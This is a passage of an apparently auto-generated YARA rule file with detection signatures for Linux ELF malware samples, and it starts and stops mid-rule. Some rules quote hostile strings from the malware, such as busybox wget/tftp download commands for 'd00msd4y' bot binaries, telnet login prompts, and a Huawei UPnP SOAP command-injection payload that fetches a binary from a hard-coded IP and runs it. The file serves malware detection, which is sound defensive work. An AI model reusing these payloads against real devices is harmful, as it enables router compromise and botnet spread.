      $s7 = "GET /d00msd4y.arm HTTP/1.0" fullword ascii
      $s8 = "heluyou login" fullword ascii
      $s9 = "kopp login" fullword ascii
      $s10 = "openwrt login" fullword ascii
      $s11 = "/bin/busybox echo -ne '%s' %s .m && /bin/busybox echo -ne '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45'" fullword ascii
      $s12 = "/bin/busybox echo '%s\\c' %s .m && /bin/busybox echo '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45\\c'" fullword ascii
      $s13 = "User-Agent: Doombot2" fullword ascii
      $s14 = "/bin/busybox wget; /bin/busybox tftp; /bin/busybox echo; wget; tftp; echo; /bin/busybox DOOMSDAY" fullword ascii
      $s15 = "GET /d00msd4y.mips HTTP/1.0" fullword ascii
      $s16 = "GET /d00msd4y.arm7 HTTP/1.0" fullword ascii
      $s17 = "/bin/busybox echo > %s.tsu && cd %s" fullword ascii
      $s18 = "GET /d00msd4y.mpsl HTTP/1.0" fullword ascii
      $s19 = "GET /d00msd4y.sh4 HTTP/1.0" fullword ascii
      $s20 = "WIFIUSB2 login" fullword ascii

      $op0 = { 8f c3 00 34 8f c2 00 30 }
      $op1 = { 8f dc 00 10 00 40 20 21 3c 02 80 00 34 42 80 01 }
      $op2 = { 8f dc 00 10 34 42 00 80 02 00 20 21 24 05 00 04 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_113 {
   meta:
      description = "Linux_113"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4480d72a324f519d3a630bf2ef7b118f4e388c5bccdd0a5465bafd2253daa619"
   strings:
      $s1 = "__stdio_mutex_initializer.4591" fullword ascii
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv4l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv4l/gcc-core/gcc/config/arm" fullword ascii
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv4l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv4l/build-gcc/gcc" fullword ascii
      $s6 = ".//////////////22///" fullword ascii /* hex encoded string '"' */
      $s7 = ".///3/2///////////////////0//0////" fullword ascii /* hex encoded string '2' */
      $s8 = "hoste.5467" fullword ascii
      $s9 = "completed.4916" fullword ascii
      $s10 = "force_to_data" fullword ascii
      $s11 = "next_start.1304" fullword ascii
      $s12 = "last_id.5525" fullword ascii
      $s13 = "object.4931" fullword ascii
      $s14 = "resolv_conf_mtime.5510" fullword ascii
      $s15 = "spec_base.4810" fullword ascii
      $s16 = "spec_flags.4815" fullword ascii
      $s17 = "spec_or_mask.4818" fullword ascii
      $s18 = "spec_chars.4816" fullword ascii
      $s19 = "spec_ranges.4817" fullword ascii
      $s20 = "last_ns_num.5524" fullword ascii

      $op0 = { 8a 00 70 a0 e3 07 00 a0 e1 f0 80 bd e8 70 40 2d }
      $op1 = { ea 00 20 a0 e3 02 00 a0 e1 f0 80 bd e8 00 00 21 }
      $op2 = { ea 37 00 90 ef 01 0a 70 e3 00 40 a0 e1 00 00 a0 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_114 {
   meta:
      description = "Linux_114"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "baad6057c142fd401540e67a518e13f2c524b83aed05fba9e4d48773c86e9924"
   strings:
      $s1 = "__stdio_mutex_initializer.4636" fullword ascii
      $s2 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s3 = "/home/landley/work/ab7/build/temp-armv6l/build-gcc/gcc" fullword ascii
      $s4 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii
      $s5 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s6 = "hoste.5443" fullword ascii
      $s7 = "completed.4959" fullword ascii
      $s8 = "libc/sysdeps/linux/arm/vfork.S" fullword ascii
      $s9 = "aeabi_unwind_cpp_pr1.c" fullword ascii
      $s10 = "libc/string/arm/memmove.S" fullword ascii
      $s11 = "object.4967" fullword ascii
      $s12 = "libc/string/arm/bcopy.S" fullword ascii
      $s13 = "spec_or_mask.4863" fullword ascii
      $s14 = "spec_ranges.4862" fullword ascii
      $s15 = "spec_and_mask.4864" fullword ascii
      $s16 = "spec_chars.4861" fullword ascii
      $s17 = "qual_chars.4865" fullword ascii
      $s18 = "prefix.4856" fullword ascii
      $s19 = "spec_flags.4860" fullword ascii
      $s20 = "spec_base.4855" fullword ascii

      $op0 = { f0 45 2d e9 34 30 92 e5 98 50 9f e5 01 a0 73 e2 }
      $op1 = { 0a f5 00 00 ea 34 40 1b e5 02 00 a0 e3 01 10 a0 }
      $op2 = { f4 ff ff ff f4 ff ff ff d0 66 00 00 f4 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_115 {
   meta:
      description = "Linux_115"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c0b3560310b81998442ba520db31b4b7a517cf05b746a0c7095d7b025eafdb20"
   strings:
      $s1 = "__stdio_mutex_initializer.4636" fullword ascii
      $s2 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s3 = "/home/landley/work/ab7/build/temp-armv6l/build-gcc/gcc" fullword ascii
      $s4 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii
      $s5 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s6 = "hoste.5443" fullword ascii
      $s7 = "completed.4959" fullword ascii
      $s8 = "libc/sysdeps/linux/arm/vfork.S" fullword ascii
      $s9 = "aeabi_unwind_cpp_pr1.c" fullword ascii
      $s10 = "libc/string/arm/memmove.S" fullword ascii
      $s11 = "object.4967" fullword ascii
      $s12 = "libc/string/arm/bcopy.S" fullword ascii
      $s13 = "spec_or_mask.4863" fullword ascii
      $s14 = "spec_ranges.4862" fullword ascii
      $s15 = "spec_and_mask.4864" fullword ascii
      $s16 = "spec_chars.4861" fullword ascii
      $s17 = "qual_chars.4865" fullword ascii
      $s18 = "prefix.4856" fullword ascii
      $s19 = "spec_flags.4860" fullword ascii
      $s20 = "spec_base.4855" fullword ascii

      $op0 = { f0 45 2d e9 34 30 92 e5 98 50 9f e5 01 a0 73 e2 }
      $op1 = { f4 ff ff ff f4 ff ff ff 18 66 00 00 f4 ff ff ff }
      $op2 = { 24 20 9f e5 24 30 9f e5 02 20 8f e0 03 c0 92 e7 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_116 {
   meta:
      description = "Linux_116"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "35a479e50f6d8320dda449fee03b301cc95ab016ce3f3c81af50e94bcf0e05bd"
   strings:
      $s1 = "/lib/ld-uClibc.so.0" fullword ascii
      $s2 = "libc.so.0" fullword ascii

      $op0 = { d0 70 01 00 04 e0 2d e5 04 f0 9d e4 3c 30 9f e5 }
      $op1 = { d0 70 01 00 74 f2 01 00 e4 f0 01 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_117 {
   meta:
      description = "Linux_117"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "fa8adf92b119b568b8e92fc5996affdcacd1f9f1ca86586f333bd7f09c71e136"
   strings:
      $s1 = "/lib/ld-uClibc.so.0" fullword ascii
      $s2 = "libc.so.0" fullword ascii

      $op0 = { e4 09 01 00 04 e0 2d e5 04 f0 9d e4 3c 30 9f e5 }
      $op1 = { e4 09 01 00 8c 8b 01 00 f8 89 01 }
      $op2 = { 8b 00 00 f0 47 2d e9 03 90 a0 e1 00 60 a0 e1 ff }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( all of them and all of ($op*) )
}

rule Linux_118 {
   meta:
      description = "Linux_118"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "217e269596b960561cfe173f0123fdafbc5812233525145239e1208ca89ba45a"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = " -g 103.188.244.189 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii
      $s4 = "bin/systemd" fullword ascii
      $s5 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s6 = "killall" fullword ascii
      $s7 = "bin/busybox" fullword ascii
      $s8 = "bin/watchdog" fullword ascii
      $s9 = "/lib/ld-uClibc.so.0" fullword ascii
      $s10 = "libc.so.0" fullword ascii
      $s11 = "MCJBG@K." fullword ascii
      $s12 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
      $s13 = " &&  mv " fullword ascii
      $s14 = "LAZ@KZ" fullword ascii
      $s15 = "@I[WK@@IFG" fullword ascii

      $op0 = { 90 1f 01 00 04 e0 2d e5 04 f0 9d e4 3c 30 9f e5 }
      $op1 = { 90 1f 01 00 9c a2 01 00 10 a0 01 }
      $op2 = { a1 00 00 58 d2 00 00 68 d5 00 00 dc bf 00 00 4c }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_119 {
   meta:
      description = "Linux_119"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f0827fb4c51f95934f2aa253ba6f287060ef38a2a9285e86da9f844efde846d3"
   strings:
      $s1 = "/lib/ld-uClibc.so.0" fullword ascii
      $s2 = "libc.so.0" fullword ascii
      $s3 = "BAdAsV" fullword ascii

      $op0 = { 08 12 01 00 04 e0 2d e5 04 f0 9d e4 3c 30 9f e5 }
      $op1 = { 08 12 01 00 18 99 01 00 1c 92 01 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( all of them and all of ($op*) )
}

rule Linux_120 {
   meta:
      description = "Linux_120"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "38e53f276af2da614e127224bad1ac3bf818e07528b32d1e4489c0e094a03ff2"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */
      $s2 = "AWAVAUATD" fullword ascii
      $s3 = "AWAVAUI" fullword ascii
      $s4 = "AVAUATI" fullword ascii
      $s5 = "AVAUATUS" fullword ascii
      $s6 = "AVAUATSH" fullword ascii
      $s7 = "D$(|WL" fullword ascii
      $s8 = "H;s`t\\B" fullword ascii
      $s9 = "CpX[A\\" fullword ascii
      $s10 = "_[]A\\A]" fullword ascii
      $s11 = "[A\\A]A^A_" fullword ascii
      $s12 = "x[]A\\A]A^A_" fullword ascii
      $s13 = "X[]A\\A]A^A_" fullword ascii
      $s14 = "Y[]A\\A]" fullword ascii
      $s15 = "CpZ[A\\" fullword ascii
      $s16 = "H[]A\\A]A^A_" fullword ascii
      $s17 = "T$0t$H" fullword ascii

      $op0 = { 8b 3d 34 a4 10 00 c7 05 26 a4 10 }
      $op1 = { e8 ea 61 00 00 e9 43 ff ff ff 90 be 09 }
      $op2 = { e8 95 61 00 00 90 e9 4d ff ff ff be 09 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_121 {
   meta:
      description = "Linux_121"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e723f54930bc91015556cdfde87eb910a803a4e3831467620e9489c788977cd9"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */
      $s3 = "AWAVAUATD" fullword ascii
      $s4 = "AWAVAUI" fullword ascii
      $s5 = "AVAUATSH" fullword ascii
      $s6 = "AVAUATU" fullword ascii
      $s7 = "AVAUATS" fullword ascii
      $s8 = "AUATUSH" fullword ascii
      $s9 = "AWAVAUATUL" fullword ascii
      $s10 = "AWAVAUATUS1" fullword ascii
      $s11 = "AUATUH" fullword ascii
      $s12 = "AVAUE1" fullword ascii
      $s13 = "D$(|WL" fullword ascii
      $s14 = "H;s`t\\B" fullword ascii
      $s15 = "CpX[A\\" fullword ascii
      $s16 = "_[]A\\A]" fullword ascii
      $s17 = "[A\\A]A^A_" fullword ascii
      $s18 = "X[]A\\A]A^A_" fullword ascii
      $s19 = "Y[]A\\A]" fullword ascii
      $s20 = "CpZ[A\\" fullword ascii

      $op0 = { 8b 7c 24 34 b9 00 40 00 00 4c 89 e6 48 8d 14 c5 }
      $op1 = { 48 b8 ff ff ff ff ff ff ff 7f 45 31 ed 48 63 dd }
      $op2 = { 45 0f be ca e9 2a ff ff ff 5b 5d 41 5c 41 83 fd }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_122 {
   meta:
      description = "Linux_122"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "503434ff2449797ffd228b7fdc79817653ff4ab20a42aed5a8a2a87fbeabda67"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */
      $s3 = "AWAVAUATD" fullword ascii
      $s4 = "AWAVAUI" fullword ascii
      $s5 = "AVAUATI" fullword ascii
      $s6 = "AVAUATSH" fullword ascii
      $s7 = "AVAUATU" fullword ascii
      $s8 = "AVAUATS" fullword ascii
      $s9 = "AUATUSH" fullword ascii
      $s10 = "AWAVAUATUL" fullword ascii
      $s11 = "s3H;%d/" fullword ascii
      $s12 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgvkl@" fullword ascii
      $s13 = "AUATUH" fullword ascii
      $s14 = "AVAUE1" fullword ascii
      $s15 = "D$(|WL" fullword ascii
      $s16 = "H;s`t\\B" fullword ascii
      $s17 = "CpX[A\\" fullword ascii
      $s18 = "_[]A\\A]" fullword ascii
      $s19 = "[A\\A]A^A_" fullword ascii
      $s20 = "X[]A\\A]A^A_" fullword ascii

      $op0 = { 8b 7c 24 34 b9 00 40 00 00 4c 89 e6 48 8d 14 c5 }
      $op1 = { 48 b8 ff ff ff ff ff ff ff 7f 45 31 ed 48 63 dd }
      $op2 = { 45 0f be ca e9 2a ff ff ff 5b 5d 41 5c 41 83 fd }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_123 {
   meta:
      description = "Linux_123"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "568a215bfc6bd71828cde42da40393352627ace59d8ff699c89fb66d2fb255dd"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = " -g 103.188.244.189 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii
      $s3 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */
      $s4 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii
      $s5 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s6 = "killall" fullword ascii
      $s7 = "AWAVAUATD" fullword ascii
      $s8 = "AWAVAUI" fullword ascii
      $s9 = "AVAUATSH" fullword ascii
      $s10 = "AVAUATU" fullword ascii
      $s11 = "AVAUATS" fullword ascii
      $s12 = "AUATUSH" fullword ascii
      $s13 = "AWAVAUATUS1" fullword ascii
      $s14 = "MCJBG@K." fullword ascii
      $s15 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
      $s16 = " &&  mv " fullword ascii
      $s17 = "AUATUH" fullword ascii
      $s18 = "D$(|WL" fullword ascii
      $s19 = "H;s`t\\B" fullword ascii
      $s20 = "CpX[A\\" fullword ascii

      $op0 = { 8b 7c 24 34 b9 00 40 00 00 4c 89 e6 48 8d 14 c5 }
      $op1 = { 48 b8 ff ff ff ff ff ff ff 7f 45 31 ed 48 63 dd }
      $op2 = { 45 0f be ca e9 2a ff ff ff 5b 5d 41 5c 41 83 fd }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_124 {
   meta:
      description = "Linux_124"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4babdcc394d5e4ec7ac1292c766918b9e0dc34aac6c9f3515c01dae24ab34343"
   strings:
      $s1 = "__stdio_mutex_initializer.4280" fullword ascii
      $s2 = "getrlimit64" fullword ascii
      $s3 = "completed.2761" fullword ascii
      $s4 = "AWAVAUI" fullword ascii
      $s5 = "AVAUATU" fullword ascii
      $s6 = "AVAUATS" fullword ascii
      $s7 = "AUATUSH" fullword ascii
      $s8 = "AWAVAUATUL" fullword ascii
      $s9 = "libc/string/x86_64/strpbrk.S" fullword ascii
      $s10 = "object.2814" fullword ascii
      $s11 = "__GI___libc_lseek" fullword ascii
      $s12 = "libc/sysdeps/linux/x86_64/crtn.S" fullword ascii
      $s13 = "libc/sysdeps/linux/x86_64/vfork.S" fullword ascii
      $s14 = "libc/string/x86_64/memset.S" fullword ascii
      $s15 = "next_start.1440" fullword ascii
      $s16 = "spec_chars.4494" fullword ascii
      $s17 = "libc/string/x86_64/strchr.S" fullword ascii
      $s18 = "spec_ranges.4495" fullword ascii
      $s19 = "unknown.2050" fullword ascii
      $s20 = "__GI_strtoll" fullword ascii

      $op0 = { eb 0c 48 63 c2 48 c7 44 c4 08 ff ff ff ff ff ca }
      $op1 = { eb 38 b8 00 04 00 00 eb 31 b8 ff ff ff 7f eb 2a }
      $op2 = { e8 49 fd ff ff ff 45 cc ff 4d d8 eb 0b 48 ff 4d }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_125 {
   meta:
      description = "Linux_125"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "5f15af20db9c991cb81469e969f26082310a93eb1c62f6086462fa98794d28b8"
   strings:
      $s1 = "__stdio_mutex_initializer.4280" fullword ascii
      $s2 = "getrlimit64" fullword ascii
      $s3 = "completed.2761" fullword ascii
      $s4 = "AWAVAUI" fullword ascii
      $s5 = "AVAUATU" fullword ascii
      $s6 = "AVAUATS" fullword ascii
      $s7 = "AUATUSH" fullword ascii
      $s8 = "AWAVAUATUL" fullword ascii
      $s9 = "libc/string/x86_64/strpbrk.S" fullword ascii
      $s10 = "object.2814" fullword ascii
      $s11 = "__GI___libc_lseek" fullword ascii
      $s12 = "libc/sysdeps/linux/x86_64/crtn.S" fullword ascii
      $s13 = "libc/sysdeps/linux/x86_64/vfork.S" fullword ascii
      $s14 = "libc/string/x86_64/memset.S" fullword ascii
      $s15 = "next_start.1440" fullword ascii
      $s16 = "spec_chars.4494" fullword ascii
      $s17 = "libc/string/x86_64/strchr.S" fullword ascii
      $s18 = "spec_ranges.4495" fullword ascii
      $s19 = "unknown.2050" fullword ascii
      $s20 = "__GI_strtoll" fullword ascii

      $op0 = { eb 0c 48 63 c2 48 c7 44 c4 08 ff ff ff ff ff ca }
      $op1 = { eb 38 b8 00 04 00 00 eb 31 b8 ff ff ff 7f eb 2a }
      $op2 = { 48 8d 85 20 ff ff ff c7 40 04 30 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_126 {
   meta:
      description = "Linux_126"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0ea2d73e47b8642b24371be112fb04e455bc8577fa17911bd17793887cedeb7e"
   strings:
      $s1 = "TVVVVVVVV" fullword ascii /* base64 encoded string 'MUUUUU' */
      $s2 = "TVVVVVVVVVVVV" fullword ascii /* base64 encoded string 'MUUUUUUUU' */
      $s3 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */
      $s4 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */
      $s5 = "UVVVVVUVV" fullword ascii /* base64 encoded string 'UUUUEU' */
      $s6 = "HVVVVVVVV" fullword ascii /* base64 encoded string 'UUUUUU' */
      $s7 = "No child process" fullword ascii
      $s8 = "*NSt13__facet_shims12_GLOBAL__N_114money_get_shimIwEE" fullword ascii
      $s9 = "*NSt13__facet_shims12_GLOBAL__N_113time_get_shimIwEE" fullword ascii
      $s10 = "*NSt13__facet_shims12_GLOBAL__N_114money_get_shimIcEE" fullword ascii
      $s11 = "template parameter object for " fullword ascii
      $s12 = "*NSt13__facet_shims12_GLOBAL__N_113time_get_shimIcEE" fullword ascii
      $s13 = "not enough space for format expansion (Please submit full bug report at https://gcc.gnu.org/bugs/):" fullword ascii
      $s14 = "1P1P1P" fullword ascii /* reversed goodware string 'P1P1P1' */
      $s15 = "No file descriptors available" fullword ascii
      $s16 = "random_device::random_device(const std::string&): unsupported token" fullword ascii
      $s17 = "NSt7__cxx119money_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEEE" fullword ascii
      $s18 = "iostream error" fullword ascii
      $s19 = "NSt7__cxx118time_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEEE" fullword ascii
      $s20 = "NSt7__cxx1115time_get_bynameIwSt19istreambuf_iteratorIwSt11char_traitsIwEEEE" fullword ascii

      $op0 = { 48 3b 3c 24 0f 85 26 ff ff ff e9 26 ff ff ff 48 }
      $op1 = { 4c 89 ef 48 c7 c2 ff ff ff ff e8 10 c8 03 00 48 }
      $op2 = { 48 8b 1d 8e 9a 09 00 49 bf ff ff ff ff ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_127 {
   meta:
      description = "Linux_127"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "549d3aac3b42f702f29ab27c653c0f239a51601a6aeb50564beda614f8f1f33e"
   strings:
      $s1 = "__stdio_mutex_initializer.4920" fullword ascii
      $s2 = "getrlimit64" fullword ascii
      $s3 = "hoste.5842" fullword ascii
      $s4 = "strtouq" fullword ascii
      $s5 = "completed.5156" fullword ascii
      $s6 = "AWAVAUI" fullword ascii
      $s7 = "AVAUATI" fullword ascii
      $s8 = "AUATUSH" fullword ascii
      $s9 = "AWAVAUATU" fullword ascii
      $s10 = "_/etc/hosts" fullword ascii
      $s11 = "strtoq" fullword ascii
      $s12 = "__GI_strtoll" fullword ascii
      $s13 = "lseek.c" fullword ascii
      $s14 = "__libc_lseek" fullword ascii
      $s15 = "last_ns_num.5903" fullword ascii
      $s16 = "unknown.1721" fullword ascii
      $s17 = "last_id.5904" fullword ascii
      $s18 = "spec_ranges.5147" fullword ascii
      $s19 = "resolv_conf_mtime.5885" fullword ascii
      $s20 = "spec_base.5142" fullword ascii

      $op0 = { 48 8d 85 20 ff ff ff c7 40 04 30 }
      $op1 = { 48 8d 85 20 ff ff ff 48 8d 55 10 48 89 50 08 48 }
      $op2 = { 89 bd 2c ff ff ff 48 89 b5 20 ff ff ff 89 95 1c }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_128 {
   meta:
      description = "Linux_128"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7deceeaf2c51f40ef0644628f157db1e1146826c036f7c08995e02d58d4336f0"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */
      $s3 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s7 = "__vdso_clock_gettime" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" fullword ascii
      $s9 = "zkjtjaz" fullword ascii
      $s10 = "AVAUATI" fullword ascii
      $s11 = "AVAUATUS" fullword ascii
      $s12 = "214.194.12.158" fullword ascii
      $s13 = "zltkaz" fullword ascii
      $s14 = "LINUX_2.6" fullword ascii
      $s15 = "99?*.`z.?\".u2.76v;**639;.354u\"2.76q\"76v;**639;.354u\"76a+gjtcv37;=?u-?8*vpupa+gjtbZ" fullword ascii
      $s16 = ";<;(3uljktmtmZ" fullword ascii
      $s17 = "2(57?uohtjthmnitkklz" fullword ascii
      $s18 = "3.uljktmtmzr" fullword ascii
      $s19 = "2(57?uoktjthmjntkjiz" fullword ascii
      $s20 = "?()354uctkthz" fullword ascii

      $op0 = { e8 59 97 00 00 e9 16 ff ff ff be 09 }
      $op1 = { e8 14 97 00 00 0f 1f 40 00 e9 5d ff ff ff be 09 }
      $op2 = { e8 01 97 00 00 90 e9 35 ff ff ff be 09 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_129 {
   meta:
      description = "Linux_129"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "3cb8715937fe09f4a1cbd7fc049f184ddb6150bf5116e1827655a7ac464054af"
   strings:
      $s1 = "ftpget" fullword ascii
      $s2 = "niUOHY_" fullword ascii
      $s3 = "SVUL_YRST[" fullword ascii
      $s4 = "MRC^UCUOR[N_W_" fullword ascii
      $s5 = "YRST_I_" fullword ascii
      $s6 = "\\NJ]_N" fullword ascii
      $s7 = "\\[WSVC" fullword ascii
      $s8 = "H_XUUN" fullword ascii
      $s9 = "IQC\\[VV" fullword ascii
      $s10 = "J[HU^C" fullword ascii

      $op0 = { 5c e3 08 e0 8d e2 18 60 8e d2 03 00 00 da 24 c0 }
      $op1 = { 70 40 2d e9 00 40 51 e2 46 df 4d e2 00 60 a0 e1 }
      $op2 = { ea 03 00 9d e8 08 d0 8d e2 70 80 bd e8 10 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_130 {
   meta:
      description = "Linux_130"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7a024331b1d877c7c88498795f3529def55d214b0c32f8f011122405adbc7135"
   strings:
      $s1 = "ftpget" fullword ascii
      $s2 = "niUOHY_" fullword ascii
      $s3 = "MRC^UCUOR[N_W_" fullword ascii
      $s4 = "YRST_I_" fullword ascii
      $s5 = "LSVUL_YRST[" fullword ascii
      $s6 = "((deleted)" fullword ascii
      $s7 = "\\NJ]_N" fullword ascii
      $s8 = "\\[WSVC" fullword ascii
      $s9 = "H_XUUN" fullword ascii
      $s10 = "IQC\\[VV" fullword ascii
      $s11 = "J[HU^C" fullword ascii

      $op0 = { 03 20 f8 09 34 10 ff ff 8f bc 00 18 17 d0 ff b4 }
      $op1 = { 10 00 00 03 34 42 00 04 34 42 00 08 00 00 18 21 }
      $op2 = { 18 21 34 42 00 01 a6 02 00 00 8f bf 00 1c 8f b0 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_131 {
   meta:
      description = "Linux_131"
      author = "PYAS Security (Using yarGen Rule Generator)"
